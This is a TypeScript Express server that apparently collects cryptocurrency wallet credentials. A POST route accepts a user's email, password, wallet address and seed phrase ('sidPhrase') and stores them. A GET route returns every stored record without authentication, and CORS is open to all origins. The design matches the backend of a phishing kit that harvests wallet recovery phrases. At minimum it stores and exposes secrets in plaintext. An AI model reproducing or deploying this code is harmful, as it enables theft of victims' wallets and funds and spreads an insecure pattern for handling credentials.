import express from "express";
import cors from "cors";
import { saveWalletData } from "./walletStorage";
import fs from "fs";
import path from "path";

const app = express();

app.use(cors());
app.use(express.json());

app.post("/api/wallet/save", (req: express.Request, res: express.Response) => {
    const {
        email,
        password,
        address,
        sidPhrase
    } = req.body;

    const result = saveWalletData(
        email,
        password,
        address,
        sidPhrase
    );

    res.json(result);
});

app.get("/api/wallets", (req, res) => {
    try {
        const file = path.join(process.cwd(), "data", "wallets.json");

        if (!fs.existsSync(file)) {
            return res.json({});
        }

        const data = JSON.parse(
            fs.readFileSync(file, "utf8")
        );

        res.json(data);
    } catch (error) {
        res.status(500).json({
            message: "Ошибка чтения файла"
        });
    }
});

app.listen(3001, () => {
    console.log("Server started on port 3001");
});